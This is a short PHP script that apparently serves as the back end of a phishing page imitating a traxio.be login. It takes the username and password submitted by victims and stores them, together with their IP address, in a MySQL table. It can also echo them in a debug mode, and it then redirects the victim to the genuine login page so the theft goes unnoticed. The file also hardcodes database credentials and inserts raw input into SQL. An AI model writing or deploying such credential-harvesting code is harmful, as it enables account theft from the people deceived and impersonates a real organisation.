<?php
$servername = "localhost";
$username = "jens";
$password = "Admin@2020";
$dbname = "logs";
$debug = True;

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
  header("Location: https://www.traxio.be/umbraco/Surface/UmbracoIdentityAccount/LogIn?redirect=%2F");
  die;
}

//Get IP
$ip="";
	if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
	
//Get POST data
$username = $_POST['Sign_in_name'];
$password = $_POST['Password'];

//Insert to database
$sql = "INSERT INTO logentries (username, password, ip_address, date)
VALUES ('$username', '$password', '$ip', now())";

//Print debug info
if($debug){
if ($conn->query($sql) === TRUE) {
  echo "New record created successfully";
  echo "<br><br>";
  echo "IP Address: ";
  echo $ip;
  echo "<br><br>";
  echo "Username: ";
  echo $_POST['Sign_in_name'];
  echo "<br><br>";
  echo "Password: ";
  echo  $_POST['Password'];
  echo "<br><br>";
} else {
  echo "Error: " . $sql . "<br>" . $conn->error;
}
}

//Close db connection
$conn->close();

//Redirect to real login page 
header("Location: https://www.traxio.be/umbraco/Surface/UmbracoIdentityAccount/LogIn?redirect=%2F");
die();
?>